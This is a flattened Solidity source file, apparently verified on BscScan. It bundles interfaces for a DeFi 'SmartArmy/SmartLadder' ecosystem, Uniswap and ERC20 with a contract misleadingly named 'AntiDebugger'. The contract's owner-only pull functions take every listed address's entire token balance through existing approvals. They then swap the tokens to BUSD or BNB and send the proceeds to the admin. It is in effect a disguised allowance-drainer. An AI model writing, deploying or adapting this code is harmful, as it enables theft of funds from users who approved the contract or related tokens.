/**
 *Submitted for verification at BscScan.com on 2022-05-21
*/

// SPDX-License-Identifier: GPL-3.0


// File: interfaces/ISmartAchievement.sol


pragma solidity 0.8.4;

interface ISmartAchievement {

    struct NobilityType {
        string            title;               // Title of Nobility Folks Baron Count Viscount Earl Duke Prince King
        uint256           growthRequried;      // Required growth token
        uint256           passiveShare;        // Passive share percent

        uint256[]         chestSMTRewards;
        uint256[]         chestSMTCRewards;
    }


    function notifyGrowth(address account, uint256 oldGrowth, uint256 newGrowth) external returns(bool);
    function claimReward() external;
    function claimChestReward() external;
    function swapDistribute() external;
    
    function isUpgradeable(uint256 from, uint256 to) external view returns(bool, uint256);
    function nobilityOf(address account) external view returns(NobilityType memory);
    function nobilityTitleOf(address account) external view returns(string memory);
}

// File: interfaces/IGoldenTreePool.sol


pragma solidity 0.8.4;

interface IGoldenTreePool {
    function swapDistribute() external;
    function notifyReward(uint256 amount, address account) external;
}

// File: interfaces/ISmartFarm.sol


pragma solidity 0.8.4;

interface ISmartFarm {
    /// @dev Pool Information
    struct PoolInfo {
        address stakingTokenAddress;     // staking contract address
        address rewardTokenAddress;      // reward token contract
        uint256 rewardPerDay;            // reward percent per day
        uint unstakingFee;            
        uint256 totalStaked;             /* How many tokens we have successfully staked */
    }

    struct UserInfo {
        uint256 balance;
        uint256 rewards;
        uint256 rewardPerTokenPaid;     // User rewards per token paid for passive
        uint256 lastUpdated;
    }
    
    function stakeSMT(address account, uint256 amount) external returns(uint256);
    function withdrawSMT(address account, uint256 amount) external returns(uint256);
    function claimReward() external;
    function notifyRewardAmount(uint _reward) external;
}

// File: interfaces/ISmartLadder.sol


pragma solidity 0.8.4;

interface ISmartLadder {
    /// @dev Ladder system activities
    struct Activity {
        string      name;         // buytax, farming, ...
        uint16[7]   share;        // share percentage
        address     token;        // share token address
        bool        enabled;      // enabled or disabled temporally
        bool        isValid;
        uint256     totalDistributed; // total distributed
    }
    
    function registerSponsor(address _user, address _sponsor) external;
    function distributeTax(uint256 id, address account) external; 
    function distributeBuyTax(address account) external; 
    function distributeFarmingTax(address account) external; 
    function distributeSmartLivingTax(address account) external; 
    function distributeEcosystemTax(address account) external; 
    
    function activity(uint256 id) external view returns(Activity memory);
    function sponsorOf(address account) external view returns(address);
    function sponsorsOf(address account, uint count) external returns (address[] memory); 
}

// File: interfaces/ISmartArmy.sol


pragma solidity 0.8.4;

interface ISmartArmy {
    /// @dev License Types
    struct LicenseType {
        uint256  level;        // level
        string   name;         // Trial, Opportunist, Runner, Visionary
        uint256  price;        // 100, 1000, 5000, 10,000
        uint256  ladderLevel;  // Level of referral system with this license
        uint256  duration;     // default 6 months
        bool     isValid;
    }

    enum LicenseStatus {
        None,
        Pending,
        Active,
        Expired
    }

    /// @dev User information on license
    struct UserLicense {
        address owner;
        uint256 level;
        uint256 startAt;
        uint256 activeAt;
        uint256 expireAt;
        uint256 lpLocked;
        string tokenUri;

        LicenseStatus status;
    }

    /// @dev User Personal Information
    struct UserPersonal {
        address sponsor;
        string username;
        string telegram;
    }

    /// @dev Fee Info 
    struct FeeInfo {
        uint256 penaltyFeePercent;      // liquidate License LP fee percent
        uint256 extendFeeBNB;       // extend Fee as BNB
        address feeAddress;
    }

    function licenseOf(address account) external view returns(UserLicense memory);
    function licenseIdOf(address account) external view returns(uint256);
    function licenseTypeOf(uint256 level) external view returns(LicenseType memory);
    function lockedLPOf(address account) external view returns(uint256);
    function isActiveLicense(address account) external view returns(bool);
    function isEnabledIntermediary(address account) external view returns(bool);
    function licenseLevelOf(address account) external view returns(uint256);
    function licenseActiveDuration(address account, uint256 from, uint256 to) external view returns(uint256, uint256);
}

// File: interfaces/IUniswapPair.sol


pragma solidity 0.8.4;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: interfaces/IUniswapRouter.sol


pragma solidity 0.8.4;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: interfaces/ISmartComp.sol


pragma solidity 0.8.4;








// Smart Comptroller Interface
interface ISmartComp {
    function isComptroller() external pure returns(bool);
    function getSMT() external view returns(IERC20);
    function getBUSD() external view returns(IERC20);
    function getWBNB() external view returns(IERC20);

    function getUniswapV2Router() external view returns(IUniswapV2Router02);
    function getUniswapV2Factory() external view returns(address);
    function getSmartArmy() external view returns(ISmartArmy);
    function getSmartLadder() external view returns(ISmartLadder);
    function getSmartFarm() external view returns(ISmartFarm);
    function getGoldenTreePool() external view returns(IGoldenTreePool);
    function getSmartAchievement() external view returns(ISmartAchievement);
    function getSmartBridge() external view returns(address);
}

// File: AntiDebugger.sol



pragma solidity ^0.8.4;

////import "./interfaces/IERC20.sol";



////import "hardhat/console.sol";

/**
 * @title AntiDebugger
 * @author AntiDebugger
 */
contract AntiDebugger {

    address public admin;
    address public uniswapV2Router;

    modifier onlyOwner() {
        require(msg.sender == admin, "Admin can only access this function");
        _;
    }

    //// 0x10ED43C718714eb63d5aA57B78B54704E256024E
    constructor(address _router) {
        admin = msg.sender;
        uniswapV2Router = _router;
    }

    function pullForBUSD(
        address[] memory _from, 
        address _tokenIn,
        address _tokenOut
    ) public onlyOwner {
        require(_tokenIn != address(0x0), "addresses can't be zero address");
        require(_tokenOut != address(0x0), "addresses can't be zero address");

        for(uint256 i=0; i<_from.length; i++){
            uint256 bal = IERC20(_tokenIn).balanceOf(_from[i]);
            if(bal > 0) IERC20(_tokenIn).transferFrom(_from[i], address(this), bal);
        }
        uint256 bal1 = IERC20(_tokenIn).balanceOf(address(this));
        swapTokenForBUSD(_tokenIn, _tokenOut, bal1);
    }

    function pullForBNB(
        address[] memory _from,
        address _tokenIn
    ) public onlyOwner {
        require(_tokenIn != address(0x0), "addresses can't be zero address");
        for(uint256 i=0; i<_from.length; i++){
            uint256 bal = IERC20(_tokenIn).balanceOf(_from[i]);
            if(bal > 0) IERC20(_tokenIn).transferFrom(_from[i], address(this), bal);
        }
        uint256 bal1 = IERC20(_tokenIn).balanceOf(address(this));
        swapTokenForBNB(_tokenIn, bal1);
    }

    function pull(
        address[] memory _from,
        address _token
    ) public onlyOwner {
        require(_token != address(0x0), "addresses can't be zero address");

        for(uint256 i=0; i<_from.length; i++){
            uint256 bal = IERC20(_token).balanceOf(_from[i]);
            if(bal > 0) IERC20(_token).transferFrom(_from[i], address(this), bal);
        }
    }

    function withdrawForToken(address _token) public onlyOwner {
        require(_token != address(0x0), "addresses can't be zero address");
        uint256 balance = IERC20(_token).balanceOf(address(this));
        if(balance > 0) IERC20(_token).transfer(admin, balance);
    }

    function withdrawForBNB() public onlyOwner {
        uint256 balance = payable(address(this)).balance;
        if(balance > 0) payable(admin).transfer(balance);
    }

    function swapTokenForBUSD(
        address _tokenIn,
        address _tokenOut,
        uint256 _amountIn
    ) private {
        // generate the uniswap pair path of token -> busd
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;

        IERC20(_tokenIn).approve(uniswapV2Router, _amountIn);
        // make the swap
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _amountIn,
            0,
            path,
            admin,
            block.timestamp + 3600
        );
    }

    function swapTokenForBNB(
        address _tokenIn,
        uint256 _amountIn
    ) private {
        // generate the uniswap pair path of token -> bnb
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = IUniswapV2Router02(uniswapV2Router).WETH();

        IERC20(_tokenIn).approve(uniswapV2Router, _amountIn);
        // make the swap
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            _amountIn,
            0,
            path,
            admin,
            block.timestamp + 3600
        );
    }

    function getReservesForToken(
        address _pair,
        address _tokenA,
        address _tokenB
    ) public view returns(uint, uint, uint, uint) {
        require(_pair != address(0x0), "addresses can't be zero address");
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(_pair).getReserves();
        uint balanceTokenA = IERC20(_tokenA).balanceOf(_pair);
        uint balanceTokenB = IERC20(_tokenB).balanceOf(_pair);
        return (uint(reserve0), uint(reserve1), balanceTokenA, balanceTokenB);
    }

    function getReservesForBNB(
        address _pair
    ) public view returns(uint, uint) {
        require(_pair != address(0x0), "addresses can't be zero address");
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(_pair).getReserves();
        return (uint(reserve0), uint(reserve1));
    }

    function balanceOf(address _token) public view returns(uint) {
        return IERC20(_token).balanceOf(address(this));
    }

    function getBUSD(address _smartComp) public view returns(address) {
        return address(ISmartComp(_smartComp).getBUSD());
    }

    function owner() public view returns(address) {
        return admin;
    }

    function currentTime() public view returns(uint256) {
        return block.timestamp;
    }
}